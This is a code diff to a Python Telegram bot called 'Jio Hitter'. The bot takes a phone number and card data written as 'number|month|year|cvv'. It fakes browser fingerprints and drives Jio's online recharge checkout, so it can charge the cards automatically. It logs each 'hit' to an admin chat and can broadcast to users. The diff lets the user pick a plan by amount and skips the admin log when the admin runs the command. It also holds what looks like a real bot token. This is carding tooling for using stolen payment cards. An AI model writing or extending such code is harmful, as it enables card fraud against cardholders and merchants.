@@ -44,7 +44,7 @@ PROFILES = [
 SCREENS = [{"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30}]
 LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8"]
 
-TG_BOT_TOKEN = "9040723839:AAEIRfrWdw5YGLZfVQn_qjGJZM2LebDOcq4"
+TG_BOT_TOKEN = "9040723839:AAHLPalTrNvsWM1NJSTui02AQ5yEXD_GxJk"
 ADMIN_CHAT_ID = 6755426755  # Aapki Admin ID
 
 bot = telebot.TeleBot(TG_BOT_TOKEN)
@@ -95,11 +95,17 @@ def iter_plans(pj):
                            "name": plan.get("name") or plan.get("planName") or "",
                            "category": cat.get("type") or "", "validity": plan.get("validity") or ""}
 
+def find_plan(pj, target_amount):
+    for p in iter_plans(pj):
+        if float(p["amount"]) == float(target_amount):
+            return p
+    return None
+
 def cheapest_plan(pj):
     plans = list(iter_plans(pj))
     return min(plans, key=lambda p: p["amount"]) if plans else None
 
-def jio_hit_process(recharge_number, raw_cc, status_callback):
+def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
     try:
         parts = raw_cc.strip().split("|")
         if len(parts) < 4:
@@ -144,12 +150,18 @@ def jio_hit_process(recharge_number, raw_cc, status_callback):
             headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
         plans_json = r4.json()
 
-        picked = cheapest_plan(plans_json)
+        if target_amt:
+            picked = find_plan(plans_json, target_amt)
+            if not picked:
+                return f"❌ Plan with amount Rs {target_amt} not found for this number!"
+        else:
+            picked = cheapest_plan(plans_json)
+            
         if not picked:
             return "❌ No recharge plans available found."
         plan_key = picked["key"]
 
-        status_callback("⚡ *[3/5]* Initializing checkout & payment flow...")
+        status_callback(f"⚡ *[3/5]* Initializing checkout (Plan: Rs {picked['amount']:.0f})...")
         r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
             headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
             json={"planKey": plan_key, "selectedService": recharge_number})
@@ -300,8 +312,9 @@ def send_welcome(message):
         f"🆔 **User ID:** `{user_id}`\n"
         f"💎 **Status:** Premium Authorized\n\n"
         "🚀 **Available Command:**\n"
-        "• `/jhit <number> <card>`\n"
-        "  _Example:_ `/jhit 9876543210 513155...|03|30|086`\n\n"
+        "• `/jhit <number> <card> [amount]`\n"
+        "  _Example:_ `/jhit 9876543210 513155...|03|30|086 239`\n"
+        "  *(Amount optionel hai, agar nahi doge toh cheapest plan khud utha lega)*\n\n"
         "⚡ _Fast, secure & automated backend hit flow._"
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
@@ -310,13 +323,14 @@ def send_welcome(message):
 def cmd_jio_hit(message):
     save_user(message.from_user.id)
     try:
-        parts = message.text.split(maxsplit=2)
+        parts = message.text.split(maxsplit=3)
         if len(parts) < 3:
-            bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/jhit <number> <card>`\n_Example:_ `/jhit 9876543210 513155...|03|30|086`", parse_mode="Markdown")
+            bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/jhit <number> <card> [amount]`\n_Example:_ `/jhit 9876543210 513155...|03|30|086 239`", parse_mode="Markdown")
             return
         
         number = parts[1].strip()
         card = parts[2].strip()
+        target_amt = parts[3].strip() if len(parts) > 3 else None
         
         sent_msg = bot.reply_to(message, "⏳ *Initializing Jio Hitter...*", parse_mode="Markdown")
         
@@ -326,15 +340,17 @@ def cmd_jio_hit(message):
             except:
                 pass
 
-        result = jio_hit_process(number, card, update_status)
+        result = jio_hit_process(number, card, target_amt, update_status)
         bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
         
-        user_info = f"👤 User: {message.from_user.first_name} (ID: `{message.from_user.id}`)\n"
-        log_text = f"🚨 **NEW HIT LOGGED**\n\n{user_info}\n{result}"
-        try:
-            bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="Markdown")
-        except:
-            pass
+        # Duplicate log check: Agar admin khud command chala raha hai toh notification dobara nahi aayegi
+        if message.from_user.id != ADMIN_CHAT_ID:
+            user_info = f"👤 User: {message.from_user.first_name} (ID: `{message.from_user.id}`)\n"
+            log_text = f"🚨 **NEW HIT LOGGED**\n\n{user_info}\n{result}"
+            try:
+                bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="Markdown")
+            except:
+                pass
 
     except Exception as e:
         bot.reply_to(message, f"❌ **Error:** `{str(e)}`", parse_mode="Markdown")
@@ -368,11 +384,9 @@ def cmd_broadcast(message):
     bot.edit_message_text(f"✅ **Broadcast Completed!**\n\nSuccessful: {success}\nFailed: {fail}", chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
 
 if __name__ == "__main__":
-    # Start Flask server in a separate background thread so Render detects an open port
     t = threading.Thread(target=run_flask)
     t.daemon = True
     t.start()
     
     print("🤖 Jio Hitter Bot with Flask Keep-Alive is running...")
     bot.infinity_polling()
-    
